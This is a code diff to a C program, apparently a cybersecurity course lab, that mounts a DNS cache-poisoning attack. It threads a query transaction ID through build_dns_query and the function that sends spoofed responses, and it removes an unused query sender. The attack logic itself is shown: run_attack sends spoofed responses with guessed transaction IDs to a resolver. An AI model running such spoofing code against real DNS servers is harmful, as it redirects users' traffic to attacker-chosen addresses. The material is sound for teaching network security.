@@ -12,7 +12,7 @@
 #define TAP1 0x80000057
 #define TAP2 0x80000062
 
-int build_dns_query(unsigned char *buffer, const char *hostname);
+int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 
 // Structure for DNS header and response construction
 int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
@@ -74,7 +74,7 @@ int build_dns_response(unsigned char *buffer, unsigned char *query, int query_le
 }
 
 // Function to send the spoofed DNS response
-void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port) {
+void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t qtxid) {
     int sockfd;
     struct sockaddr_in server_addr;
     unsigned char buffer[BUFFER_SIZE];
@@ -94,7 +94,7 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
 
     // Step 3: Assume we already have the DNS query (this would normally come from the client)
     unsigned char query[BUFFER_SIZE];
-    int query_len = build_dns_query(query, hostname);  
+    int query_len = build_dns_query(query, hostname, qtxid);  
     printf("query_len: %d\n", query_len);
     // Step 4: Build the DNS response
     int response_len = build_dns_response(buffer, query, query_len, txid);
@@ -186,7 +186,7 @@ void run_attack(uint32_t *txid_ls) {
     inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
     printf("step 2 done\n");
     // Step 3: Build the DNS query
-    int query_len = build_dns_query(buffer, hostname);
+    int query_len = build_dns_query(buffer, hostname, 1234);
     printf("step 3 done\n");
     printf("buffer: %s\n", buffer);
     // Step 4: Send the DNS query
@@ -220,7 +220,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port);
+        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid);
     }
     
     // Close the connection
@@ -230,9 +230,9 @@ void run_attack(uint32_t *txid_ls) {
 
 
 // Function to build a DNS query
-int build_dns_query(unsigned char *buffer, const char *hostname) {
+int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
     int query_len = 0;
-    uint32_t txid = htons(0x1234); // Transaction ID
+    uint32_t txid = htons(tid); // Transaction ID
     unsigned short flags = htons(0x0100); // Standard query
     unsigned short q_count = htons(1);   // 1 question
     unsigned short ans_count = 0;        // No answers
@@ -281,66 +281,13 @@ int build_dns_query(unsigned char *buffer, const char *hostname) {
     return query_len;
 }
 
-// Function to send the DNS query 
-void send_dns_query(const char *hostname) {
-    int sockfd;
-    struct sockaddr_in server_addr;
-    unsigned char buffer[BUFFER_SIZE];
-
-    // Step 1: Create a UDP socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        perror("Socket creation failed");
-        exit(EXIT_FAILURE);
-    }
-    // Step 2: Configure the DNS server address
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(DNS_SERVER_PORT);
-    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
-    printf("step 2 done\n");
-    // Step 3: Build the DNS query
-    int query_len = build_dns_query(buffer, hostname);
-    printf("step 3 done\n");
-    // Step 4: Send the DNS query
-    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Failed to send DNS query");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-
-    printf("DNS query sent for hostname: %s\n", hostname);
-
-    // Step 5: Receive the DNS response
-    socklen_t server_addr_len = sizeof(server_addr);
-    int response_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
-    if (response_len < 0) {
-        perror("Failed to receive DNS response");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-
-    printf("DNS response received (%d bytes).\n", response_len);
-
-    // Optional: Print the raw DNS response
-    printf("Raw DNS Response:\n");
-    for (int i = 0; i < response_len; i++) {
-        printf("%02x ", buffer[i]);
-        if ((i + 1) % 16 == 0) printf("\n");
-    }
-    printf("\n");
-
-    // Step 6: Close the socket
-    close(sockfd);
-}
-
 int main() {
     uint32_t txid[10];
 
     // Step 1: Get the TXID from the info server
     run_attack(txid);
 
-    //send_dns_query(hostname);
+
     return 0;
 }
 
